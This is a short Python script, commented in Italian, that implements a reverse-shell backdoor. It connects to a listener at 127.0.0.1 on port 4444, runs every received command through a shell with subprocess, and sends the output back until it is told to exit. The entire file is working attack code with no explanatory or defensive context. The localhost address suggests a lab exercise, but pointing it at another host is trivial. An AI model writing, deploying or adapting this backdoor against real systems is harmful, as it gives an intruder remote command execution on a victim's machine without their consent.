import socket
import subprocess

def reverse_backdoor():
    ip_address = "127.0.0.1"
    port = 4444

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((ip_address, port))

        while True:
            # Riceve comandi dal listener
            command = sock.recv(1024).decode('utf-8').strip()

            if command.lower() == 'exit':
                break

            if command:
                # Esegue il comando
                proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                stdout_value = proc.stdout.read() + proc.stderr.read()
                # Invio del risultato del comando al listener
                sock.send(stdout_value)
    except Exception as e:
        print(f"Errore di connessione: {e}")
    finally:
        sock.close()

if __name__ == "__main__":
    reverse_backdoor()
